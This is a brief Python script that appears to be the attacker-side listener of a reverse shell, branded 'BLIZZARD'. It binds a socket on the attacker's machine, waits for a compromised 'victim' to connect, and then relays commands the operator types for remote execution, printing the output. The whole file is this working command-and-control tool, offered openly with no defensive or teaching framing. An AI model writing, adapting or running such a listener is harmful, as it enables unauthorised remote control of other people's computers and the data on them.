import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = socket.gethostbyname(socket.gethostname()) #change it to your attacking computer's IP
PORT = 1327
print(HOST)
server.bind((HOST,PORT))
server.listen(1)
print("WELCOME TO THE BLIZZARD!!!")
print(f"Listening on port {PORT}")
while True:
    client, address = server.accept()
    print(f"WE GOT ONE: {address[0]}")
    while True:
        command = input("Command on victim: ")
        client.send(command.encode("utf-8"))
        print(client.recv(1024).decode("utf-8"))